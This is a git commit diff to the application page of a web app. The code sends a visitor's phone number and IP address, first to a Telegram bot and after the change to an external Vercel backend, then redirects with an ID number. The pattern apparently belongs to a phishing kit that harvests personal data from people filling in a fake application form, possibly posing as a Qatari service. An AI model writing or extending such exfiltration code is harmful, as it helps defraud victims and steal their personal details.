1ba88fb47c77120ed74dbc3b214f5000879b53ce
AboIslam123179 <tiktokqatr@gmail.com>
2025-10-01 03:54:42 +0300

    Update page.js

--- app/apply/page.js
+++ app/apply/page.js
@@ -47,17 +47,11 @@ export default function ResultPage() {
     const message = `Phone Number: ${mobileNumber}\nIP Adress: ${userIP}`;
 
     try {
-      const response = await fetch(
-        `https://api.telegram.org/bot${botToken}/sendMessage`,
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-          }),
-        }
-      );
+      const response = await fetch("https://wuaze-qata-backend.vercel.app/send", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ text: message }),
+      });
 
       if (response.ok) {
         router.push(`/summary?idNumber=${idNumber}`);
